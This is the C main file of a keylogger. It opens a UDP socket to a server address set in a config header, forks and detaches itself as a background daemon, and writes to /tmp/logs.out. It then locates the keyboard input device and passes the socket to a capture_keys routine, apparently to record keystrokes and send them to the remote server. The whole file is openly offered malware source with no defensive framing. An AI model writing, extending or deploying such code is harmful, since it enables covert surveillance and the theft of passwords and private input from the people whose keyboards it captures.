#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include "help.h"
#include "config.h"
#include "keylogger.h"

int main()
{
    FILE *file;
    char *keyboard_event_filename = NULL;

    int socket_desc;
    struct sockaddr_in server_addr;

    socket_desc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (socket_desc < 0)
    {
        printf("error: could not create socket\n");
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_ADDR);

    pid_t pid, sid;
    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    else if (pid > 0)
    {
        printf("Child PID: %d\n", pid);
        exit(EXIT_SUCCESS);
    }

    umask(0);
    sid = setsid();

    file = fopen("/tmp/logs.out", "w");

    keyboard_event_filename = find_keyboard(keyboard_event_filename);

    capture_keys(file, keyboard_event_filename, socket_desc, server_addr);

    return 0;
}
